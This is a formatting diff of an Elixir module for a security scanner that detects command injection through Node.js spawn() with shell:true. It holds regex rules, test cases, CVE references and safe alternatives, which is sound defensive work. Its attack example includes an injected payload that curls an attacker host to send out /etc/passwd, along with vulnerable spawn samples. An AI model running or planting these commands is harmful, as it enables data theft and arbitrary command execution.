@@ -1,34 +1,34 @@
 defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
   @moduledoc """
   Command Injection via child_process.spawn with shell:true in JavaScript/Node.js
-  
+
   Detects dangerous patterns like:
     spawn("sh", ["-c", userInput], {shell: true})
     spawn(cmd, {shell: true, cwd: req.body.path})
     spawn("bash", ["-c", `echo ${userData}`], {shell: true})
-    
+
   Safe alternatives:
     spawn("echo", [userData])
     spawn("ls", ["-la", directory])
     execFile("git", ["status"], {cwd: safePath})
-    
-  The child_process.spawn() function in Node.js with the shell:true option creates 
-  a critical command injection vulnerability when combined with user-controlled input. 
-  Unlike spawn() without shell option which executes commands directly, shell:true 
-  passes the command through the system shell (/bin/sh, cmd.exe, etc.), enabling 
+
+  The child_process.spawn() function in Node.js with the shell:true option creates
+  a critical command injection vulnerability when combined with user-controlled input.
+  Unlike spawn() without shell option which executes commands directly, shell:true
+  passes the command through the system shell (/bin/sh, cmd.exe, etc.), enabling
   shell metacharacter injection and arbitrary command execution.
-  
+
   ## Vulnerability Details
-  
-  The shell:true option fundamentally changes spawn() behavior from safe direct 
+
+  The shell:true option fundamentally changes spawn() behavior from safe direct
   execution to dangerous shell interpretation. This creates multiple attack vectors:
-  
+
   1. **Shell Metacharacter Injection**: Semicolons, pipes, redirections become active
   2. **Command Chaining**: Multiple commands via &&, ||, ; operators
   3. **Process Substitution**: Advanced shell features for data exfiltration
   4. **Environment Variable Exploitation**: Shell expansion of $VAR and `command`
   5. **File System Operations**: Redirection operators for file manipulation
-  
+
   ### Attack Example
   ```javascript
   // Vulnerable: spawn with shell:true and user input
@@ -37,24 +37,24 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
     spawn('tar', ['-czf', 'backup.tar.gz', filename], {shell: true});
     // <- Complete filesystem destruction
   });
-  
+
   // Vulnerable: Dynamic command construction
   const userScript = req.body.script; // "; curl attacker.com/steal?data=$(cat /etc/passwd)"
   spawn('powershell', ['-Command', userScript], {shell: true});
   // <- Data exfiltration via DNS
   ```
-  
+
   ### Modern Attack Scenarios
-  Command injection via spawn+shell is extensively exploited in CI/CD systems, 
-  deployment automation, file processing workflows, and developer tools. Attackers 
-  leverage shell features for persistence, lateral movement, data exfiltration, 
-  and infrastructure compromise. The vulnerability is particularly dangerous in 
+  Command injection via spawn+shell is extensively exploited in CI/CD systems,
+  deployment automation, file processing workflows, and developer tools. Attackers
+  leverage shell features for persistence, lateral movement, data exfiltration,
+  and infrastructure compromise. The vulnerability is particularly dangerous in
   containerized environments where shell injection can escape sandbox boundaries.
   """
-  
+
   use Rsolv.Security.Patterns.PatternBase
   alias Rsolv.Security.Pattern
-  
+
   def pattern do
     %Pattern{
       id: "js-command-injection-spawn",
@@ -66,7 +66,8 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       regex: ~r/spawn\s*\([^)]*\{[^}]*shell\s*:\s*true/i,
       cwe_id: "CWE-78",
       owasp_category: "A03:2021",
-      recommendation: "Avoid shell:true. Use spawn without shell option and pass arguments as array.",
+      recommendation:
+        "Avoid shell:true. Use spawn without shell option and pass arguments as array.",
       test_cases: %{
         vulnerable: [
           ~S|spawn("sh", ["-c", userInput], {shell: true})|,
@@ -105,47 +106,47 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       }
     }
   end
-  
+
   @doc """
   Comprehensive vulnerability metadata for command injection via spawn with shell.
-  
+
   This metadata documents the critical security implications of using spawn() with
   shell:true option and provides authoritative guidance for secure process execution.
   """
   def vulnerability_metadata do
     %{
       description: """
-      Command injection via child_process.spawn() with shell:true represents a 
-      critical vulnerability class that enables arbitrary command execution through 
-      shell metacharacter injection. This vulnerability combines the power of 
-      direct process spawning with the dangerous flexibility of shell interpretation, 
+      Command injection via child_process.spawn() with shell:true represents a
+      critical vulnerability class that enables arbitrary command execution through
+      shell metacharacter injection. This vulnerability combines the power of
+      direct process spawning with the dangerous flexibility of shell interpretation,
       creating extensive attack surface for malicious actors.
-      
-      The shell:true option fundamentally transforms spawn() from a safe, direct 
-      process execution mechanism into a dangerous shell command interpreter. Unlike 
-      spawn() without shell option, which executes binaries directly with explicit 
-      arguments, shell:true routes commands through the system shell (/bin/sh on 
-      Unix systems, cmd.exe on Windows), enabling the full range of shell features 
+
+      The shell:true option fundamentally transforms spawn() from a safe, direct
+      process execution mechanism into a dangerous shell command interpreter. Unlike
+      spawn() without shell option, which executes binaries directly with explicit
+      arguments, shell:true routes commands through the system shell (/bin/sh on
+      Unix systems, cmd.exe on Windows), enabling the full range of shell features
       including metacharacters, pipes, redirections, and command substitution.
-      
-      This vulnerability is particularly insidious because spawn() with shell:true 
-      appears similar to safer alternatives, leading developers to inadvertently 
-      introduce command injection vulnerabilities when processing user-controlled 
-      input. The attack surface is further expanded by the cross-platform nature 
-      of Node.js, as different shell environments provide varying exploitation 
+
+      This vulnerability is particularly insidious because spawn() with shell:true
+      appears similar to safer alternatives, leading developers to inadvertently
+      introduce command injection vulnerabilities when processing user-controlled
+      input. The attack surface is further expanded by the cross-platform nature
+      of Node.js, as different shell environments provide varying exploitation
       techniques and capabilities.
-      
-      Modern application architectures amplify the risk through microservices, 
-      containerization, and CI/CD integration, where command injection can provide 
-      attackers with pivot points for lateral movement, infrastructure compromise, 
-      and supply chain attacks. The persistence capabilities enabled by shell 
-      injection make this vulnerability class a preferred vector for advanced 
+
+      Modern application architectures amplify the risk through microservices,
+      containerization, and CI/CD integration, where command injection can provide
+      attackers with pivot points for lateral movement, infrastructure compromise,
+      and supply chain attacks. The persistence capabilities enabled by shell
+      injection make this vulnerability class a preferred vector for advanced
       persistent threats targeting development and deployment infrastructure.
-      
-      Command injection vulnerabilities in spawn() are especially prevalent in 
-      DevOps tooling, build systems, file processing applications, and automation 
-      scripts where dynamic command construction is common. The widespread adoption 
-      of Node.js in backend services and tooling creates significant exposure 
+
+      Command injection vulnerabilities in spawn() are especially prevalent in
+      DevOps tooling, build systems, file processing applications, and automation
+      scripts where dynamic command construction is common. The widespread adoption
+      of Node.js in backend services and tooling creates significant exposure
       across enterprise environments and cloud infrastructure.
       """,
       references: [
@@ -165,7 +166,8 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
           type: :vendor,
           id: "NODE_CHILD_PROCESS",
           title: "Node.js Documentation - Child Process",
-          url: "https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options"
+          url:
+            "https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options"
         },
         %{
           type: :nist,
@@ -176,7 +178,8 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
         %{
           type: :research,
           id: "command_injection_analysis",
-          title: "Command Injection Vulnerabilities in Node.js Applications: A Systematic Analysis",
+          title:
+            "Command Injection Vulnerabilities in Node.js Applications: A Systematic Analysis",
           url: "https://www.usenix.org/conference/usenixsecurity21/presentation/nodejs-security"
         },
         %{
@@ -209,10 +212,12 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       cve_examples: [
         %{
           id: "CVE-2022-25912",
-          description: "simple-git npm package command injection through spawn() with shell option",
+          description:
+            "simple-git npm package command injection through spawn() with shell option",
           severity: "critical",
           cvss: 9.8,
-          note: "Git command output processed through spawn() with shell:true enabling arbitrary command execution"
+          note:
+            "Git command output processed through spawn() with shell:true enabling arbitrary command execution"
         },
         %{
           id: "CVE-2021-23440",
@@ -244,23 +249,23 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
         }
       ],
       detection_notes: """
-      This pattern detects child_process.spawn() calls that include the shell:true 
-      option, which enables shell interpretation and command injection vulnerabilities. 
+      This pattern detects child_process.spawn() calls that include the shell:true
+      option, which enables shell interpretation and command injection vulnerabilities.
       The detection covers:
-      
+
       1. Direct shell option: spawn(cmd, args, {shell: true})
       2. Options object with shell: spawn(cmd, {shell: true, other: value})
       3. Shell option in various positions within options object
       4. Case-insensitive matching for shell property names
       5. Whitespace variations around the colon and true value
-      
-      The regex pattern looks for spawn() followed by parentheses containing an 
-      options object with shell:true. It uses case-insensitive matching to catch 
+
+      The regex pattern looks for spawn() followed by parentheses containing an
+      options object with shell:true. It uses case-insensitive matching to catch
       variations in property naming and includes flexible whitespace handling.
-      
-      The pattern is designed to have high sensitivity for security scanning while 
-      avoiding false positives on spawn() calls without shell option or with 
-      shell:false. However, any spawn() usage with user-controlled input should 
+
+      The pattern is designed to have high sensitivity for security scanning while
+      avoiding false positives on spawn() calls without shell option or with
+      shell:false. However, any spawn() usage with user-controlled input should
       be carefully reviewed regardless of shell option.
       """,
       safe_alternatives: [
@@ -348,35 +353,35 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       }
     }
   end
-  
+
   @doc """
   Returns AST enhancement rules to reduce false positives.
-  
+
   This enhancement helps distinguish between actual command injection vulnerabilities and:
   - spawn() calls without shell option (safe by default)
   - spawn() calls with shell:false explicitly set
   - spawn() calls using array arguments (safer than string concatenation)
   - Test/script code that uses shell for legitimate purposes
   - Build tools that require shell features
-  
+
   ## Examples
-  
+
       iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
       iex> Map.keys(enhancement) |> Enum.sort()
       [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
-      
+
       iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
       iex> enhancement.ast_rules.node_type
       "CallExpression"
-      
+
       iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
       iex> enhancement.ast_rules.option_analysis.has_shell_true
       true
-      
+
       iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
       iex> enhancement.min_confidence
       0.8
-      
+
       iex> enhancement = Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn.ast_enhancement()
       iex> "uses_array_command" in Map.keys(enhancement.confidence_rules.adjustments)
       true
@@ -394,8 +399,10 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       },
       context_rules: %{
         exclude_paths: [~r/test/, ~r/spec/, ~r/__tests__/, ~r/node_modules/, ~r/scripts/],
-        safe_if_no_shell: true,           # spawn without shell is safer
-        safe_if_array_command: true       # spawn(['cmd', 'arg1', 'arg2']) is safer
+        # spawn without shell is safer
+        safe_if_no_shell: true,
+        # spawn(['cmd', 'arg1', 'arg2']) is safer
+        safe_if_array_command: true
       },
       confidence_rules: %{
         base: 0.3,
@@ -409,5 +416,4 @@ defmodule Rsolv.Security.Patterns.Javascript.CommandInjectionSpawn do
       min_confidence: 0.8
     }
   end
-  
 end
